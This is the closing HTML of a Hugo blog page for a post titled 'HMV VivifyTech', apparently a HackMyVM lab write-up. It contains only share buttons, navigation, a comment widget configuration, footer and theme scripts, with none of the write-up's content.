+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://www.zhuangsanmeng.xyz/vuln_hmv5/" data-title="HMV VivifyTech" data-hashtags="渗透"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://www.zhuangsanmeng.xyz/vuln_hmv5/" data-hashtag="渗透"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://www.zhuangsanmeng.xyz/vuln_hmv5/" data-title="HMV VivifyTech"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://www.zhuangsanmeng.xyz/vuln_hmv5/" data-title="HMV VivifyTech"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://www.zhuangsanmeng.xyz/vuln_hmv5/" data-title="HMV VivifyTech"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/vuln_hmv4/" class="prev" rel="prev" title="HMV buster"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HMV buster</a>
+            <a href="/hgame2025_crypto/" class="next" rel="next" title="Hgame2025_crypto">Hgame2025_crypto<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src=''></script>
+
+    <script type="text/javascript">
+        new Valine({
+            el: '#valine',
+            appId: 'XiJ1G58psCdX6BgfE27O7IH9-MdYXbMMI',
+            appKey: 'e9j5fWZui0l2YfNwupu7SDW2',
+            notify: '',
+            verify: '',
+            avatar: 'mp',
+            placeholder: '留下你的评论～',
+            visitor: 'true'
+        });
+    </script></div></article></div>
+            </main><footer class="footer">
+    <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer"
+                title="Hugo 0.147.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank"
+                rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw"
+                    aria-hidden="true"></i> LoveIt</a>
+        </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a
+                    href="/" target="_blank">Zsm</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br" />
+            <span class="icp">豫ICP备2024048128号</span></div>
+    
+        
+        <script async src=" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js "></script>
+    
+
+    
+        
+            <section>
+                
+                    <span id="busuanzi_container_value_site_pv"><i class="far fa-eye fa-fw"></i>
+                        
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+
+                
+                    &nbsp;|&nbsp;              
+                
+
+                
+                    <span id="busuanzi_container_value_site_uv"><i class="fa fa-user"></i>
+                        
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+            </section>
+        
+
+        
+        
+    
+
+</div>
+</footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
